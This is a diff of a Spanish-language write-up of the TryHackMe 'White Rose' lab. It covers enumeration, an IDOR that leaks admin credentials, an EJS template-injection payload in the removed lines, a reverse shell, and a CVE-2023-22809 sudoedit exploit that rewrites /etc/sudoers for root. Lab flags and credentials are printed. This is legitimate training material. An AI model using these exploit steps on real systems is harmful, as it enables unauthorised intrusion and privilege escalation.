@@ -1,128 +1,144 @@
+# White Rose Writeup
 
-**primero empezaremos con la fase de escaneo 
+## Escaneo
 
-**vamos a utilizar la herramienta ==nmap==  
+Empezamos con la fase de escaneo utilizando la herramienta `nmap`:
 
-```
+```bash
 nmap -p- --open -Pn -n -sV --min-rate 5000 -sS <HOST> -oN white -vvv
 ```
 
-**podemos ver que tenemos los puertos ==22/ssh== ==80/http== 
+Podemos ver que los puertos abiertos son `22/ssh` y `80/http`:
 
-```
+```plaintext
 PORT   STATE SERVICE REASON         VERSION
 22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
 80/tcp open  http    syn-ack ttl 63 nginx 1.14.0 (Ubuntu)
 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Read data files from: /usr/share/nmap
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 23.39 seconds
-           Raw packets sent: 74647 (3.284MB) | Rcvd: 73697 (2.948MB)
-
 ```
 
-**a el revisar el puerto 80 podemos ver que tiene un Dominio registramos el dominio en ==/etc/hosts== y podemos ver que nos encontramos con una pagina de mantenimiento 
+Al revisar el puerto 80, vemos que tiene un dominio. Registramos el dominio en `/etc/hosts` y encontramos una página de mantenimiento:
 
-![[white.png]]
+![Página de mantenimiento](anexo_white/white.png)
 
-**Ahora buscaremos un subdominante ya que con gobuster no encontramos nada en este dominio  utilizare ==FFUF== para enumerar subdominios
+---
 
-```
-ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-  110000.txt -u http://cyprusbank.thm -H "HOST:FUZZ.cyprusbank.thm" -fw 1
-```
+## Enumeración de Subdominios
 
-**y podemos ver que encontramos los dominios 
+Buscaremos subdominios utilizando `ffuf`:
 
-```
-www             
-admin              
+```bash
+ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://cyprusbank.thm -H "HOST:FUZZ.cyprusbank.thm" -fw 1
 ```
 
-**ahora agregamos los Dominios a el Dominio en ==/etc/hosts==
+Encontramos los siguientes subdominios:
 
-**bien con el subdominio ==admin==  podemos ver que nos encontramos con la pagina de sesión de el banco![[white2.png]]
-
-**ahora vamos a iniciar sesión con las credenciales que nos da tryhackme de ==Olivia Cortez:olivi8==  una vez dentro a revisar la pagina podemos ver una conversación de usuarios 
-
-![[white3.png]]
-
-**podemos ver que contiene una vulnerabilidad de ==IDOR==  ya que nos permite ver las conversaciones anteriores y a el revisar podemos ver que nos brindan la password de un administrador 
-```
-user = Gayle Bev | pass = p~]P@5!6;rs558:q
+```plaintext
+www
+admin
 ```
 
-**una vez dentro podemos ver que podemos ver el los numeros y a el buscar ya tenemos la primera respuesta 
+Agregamos los dominios al archivo `/etc/hosts`. Al visitar el subdominio `admin`, encontramos una página de inicio de sesión:
 
-![[white4.png]]
+![Página de inicio de sesión](anexo_white/white2.png)
 
-**bien ahora vamos a buscar una forma de poder conectarnos a la maquina en la parte de cambiar password vamos a interceptarla con burpsuite 
+---
 
-![[white5.png]]
+## Acceso Inicial
 
-**a el eliminar password me mando un mensaje de error indicandome sobre ==ejs== a el investigar sobre ==SSTI== en ejs podemos encontrar  
+Iniciamos sesión con las credenciales proporcionadas:
 
+- Usuario: `Olivia Cortez`
+- Contraseña: `olivi8`
+
+Dentro de la página, revisamos las conversaciones de usuarios:
+
+![Conversaciones de usuarios](anexo_white/white3.png)
+
+Observamos una vulnerabilidad de **IDOR**, lo que nos permite ver conversaciones anteriores. Aquí encontramos las credenciales de administrador:
+
+```plaintext
+Usuario: Gayle Bev
+Contraseña: p~]P@5!6;rs558:q
 ```
-&settings[view options][outputFunctionName]=x;process.mainModule.require('child_process').execSync('');//
-```
 
-**creamos la reverse-shell en este caso use ==busy==  y la codifique en base64 , mandamos la shell con burpsuite 
+Al iniciar sesión con estas credenciales, podemos acceder a información adicional y obtener la primera respuesta:
 
-![[white7.png]]
+![Respuesta obtenida](anexo_white/white4.png)
 
+---
 
-**y tenemos conexión con la maquina
+## Conexión a la Máquina
 
-![[white8.png]]
+Interceptamos la solicitud de cambio de contraseña con Burp Suite:
 
-**para un shell mas interactivo usaremos 
+![Interceptación de solicitud](anexo_white/white5.png)
 
-```
+El error reportado menciona `ejs`, lo que indica una posible vulnerabilidad **SSTI**. Creamos una reverse shell codificada en Base64 y la enviamos con Burp Suite:
+
+![Reverse shell enviada](anexo_white/white7.png)
+
+Logramos conectarnos a la máquina:
+
+![Conexión establecida](anexo_white/white8.png)
+
+Para una shell interactiva, ejecutamos:
+
+```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
-
 export TERM=xterm
-
 stty raw -echo; fg
 ```
 
-**bien una vez dentro vamos a buscar las flags y empecemos por la primera ==user.txt==
+---
 
-**usaremos el comando ==find== para buscar las flags 
+## Primera Flag
 
-```
+Usamos el comando `find` para localizar la flag `user.txt`:
+
+```bash
 find / -name user.txt 2>/dev/null
 ```
 
-**y nos regresa que se encuentra en la carpeta ==/home/web== 
+La flag se encuentra en `/home/web`:
 
-
-``THM{4lways_upd4te_uR_d3p3nd3nc!3s}``
-
-**y bien ya tenemos la primera ahora vamos por la segunda flags que se encuentra en ==/root== pero para esta flag necesitamos escalar privilegios 
-
-**a el usar el ``sudo -l`` podemos ver que con sudo nos podemos convertir en root mediante 
-
+```plaintext
+THM{4lways_upd4te_uR_d3p3nd3nc!3s}
 ```
+
+---
+
+## Escalada de Privilegios
+
+Al usar `sudo -l`, vemos que podemos usar `sudoedit`:
+
+```plaintext
 User web may run the following commands on cyprusbank:
     (root) NOPASSWD: sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
-
 ```
 
-**hagamos un poco de investigación sobre `sudoedit` , 1. vamos a verificar la versión de sudoedit  podemos ver que tenemos la versión  ==1.9.12p11== bueno a buscar si contiene alguna vulnerabilidad registrada bueno encontramos una `CVE-2023-22809` ahora a explotarla a ver, con ==SUDO_EDITOR== agregamos a sudores a sudoedit 
+Investigamos la versión de `sudoedit` (`1.9.12p11`) y encontramos la vulnerabilidad **CVE-2023-22809**. Configuramos el editor `SUDO_EDITOR` para modificar el archivo `sudoers`:
 
-```
+```bash
 export SUDO_EDITOR='nano -- /etc/sudoers'
 sudoedit /etc/nginx/sites-available/admin.cyprusbank.thm
 ```
 
-**luego agregamos el usuario `web` a root 
-`
-```
+Agregamos el siguiente texto al archivo `sudoers`:
+
+```plaintext
 web ALL:(ALL:ALL) NOPASSWD: ALL
 ```
 
-`sudo su` **y listo ya somos root ahora abrimos la flag y ya terminamos la maquina
+Luego, usamos `sudo su` para convertirnos en root y obtenemos la flag `root.txt`:
 
-``THM{4nd_uR_p4ck4g3s}
+```plaintext
+THM{4nd_uR_p4ck4g3s}
+```
 
-***con esto culminamos la maquina White Rose
+---
+
+## Conclusión
+
+Con esto, completamos la máquina **White Rose**. ¡Buen trabajo!
+
